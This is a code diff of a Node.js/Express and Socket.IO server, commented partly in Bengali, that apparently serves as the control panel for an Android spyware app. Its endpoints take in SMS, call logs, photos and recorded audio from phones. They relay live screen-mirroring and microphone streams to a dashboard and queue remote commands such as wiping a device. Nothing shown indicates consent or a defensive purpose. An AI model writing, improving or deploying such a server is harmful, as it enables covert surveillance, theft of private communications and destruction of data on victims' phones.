@@ -7,7 +7,7 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*" },
-    maxHttpBufferSize: 1e8 // ১০০ মেগাবাইট পর্যন্ত ফাইল/ফ্রেম সাপোর্ট
+    maxHttpBufferSize: 1e8 // 100MB support
 });
 
 const PORT = process.env.PORT || 3000;
@@ -19,39 +19,37 @@ let devices = {};
 
 // --- APK Connectivity API ---
 
-// ১. হার্টবিট এবং কমান্ড আদান-প্রদান (সব ফিচারের কমান্ড রুট)
+// ১. হার্টবিট এবং কমান্ড আদান-প্রদান
 app.post('/api/ping', (req, res) => {
     const { deviceId, status } = req.body;
     if (deviceId) {
         if (!devices[deviceId]) devices[deviceId] = { commands: [], lastSeen: '' };
-        devices[deviceId].info = status; // Model, Battery, SIM Info, Network, etc.
+        devices[deviceId].info = status; 
         devices[deviceId].lastSeen = new Date().toLocaleTimeString();
         
-        // ড্যাশবোর্ডে লাইভ আপডেট পাঠানো
-        io.emit('update_list', { deviceId, ...devices[deviceId] });
+        // প্যানেলে ডিভাইস আপডেট পাঠানো
+        io.emit('update_list', { deviceId, info: status });
         
-        // অ্যাপের জন্য পেন্ডিং কমান্ড (Wipe, TTS, Vibrate, etc.) পাঠানো
+        // অ্যাপের জন্য কমান্ড পাঠানো
         const cmdToSend = devices[deviceId].commands.splice(0);
         res.json({ commands: cmdToSend });
     } else res.status(400).send();
 });
 
-// ২. ডিপ ডাটা এবং ফাইল আপলোড (SMS, Call Logs, Photos, Recorded Audio)
+// ২. ডাটা এবং ফাইল আপলোড (SMS, Call Logs, Photos, etc.)
 app.post('/api/upload', (req, res) => {
     const { deviceId, type, data, fileName } = req.body;
-    
-    // ড্যাশবোর্ডের স্পেসিফিক মডিউলে ডাটা পাঠানো
+    // সরাসরি প্যানেলে পাঠানো
     io.emit('new_incoming_data', { deviceId, type, data, fileName });
-    
     console.log(`[ALERTER] ${type} received from ${deviceId}`);
     res.json({ status: 'success' });
 });
 
-// ৩. লাইভ স্ক্রিন মিররিং এবং মাইক্রোফোন স্ট্রিমিং
+// ৩. লাইভ স্ট্রিমিং রুট (ইভেন্ট নাম ফিক্স করা হয়েছে)
 app.post('/api/stream', (req, res) => {
     const { deviceId, streamType, buffer } = req.body;
-    // সরাসরি ড্যাশবোর্ড স্ক্রিনে পুশ করা
-    io.emit('live_stream', { deviceId, streamType, buffer });
+    // প্যানেলের 'new_incoming_data' ইভেন্টের সাথে মিল রাখা হয়েছে
+    io.emit('new_incoming_data', { deviceId, type: streamType, data: buffer });
     res.status(200).send();
 });
 
@@ -61,15 +59,10 @@ io.on('connection', (socket) => {
 
     socket.on('send_cmd', ({ id, cmd, payload }) => {
         if (devices[id]) {
-            // ২০টি ফিচারের যেকোনো কমান্ড কিউতে রাখা
+            // কমান্ড কিউতে রাখা যা পরবর্তী Ping-এ অ্যাপ পাবে
             devices[id].commands.push({ action: cmd, ...payload });
             console.log(`[CONTROL] ${cmd} assigned to ${id}`);
         }
-    });
-
-    // সরাসরি মিররিং ফ্রেম রিসিভ করা (Socket এর মাধ্যমে)
-    socket.on('screen_frame', (data) => {
-        socket.broadcast.emit('display_frame', data);
     });
 });
 
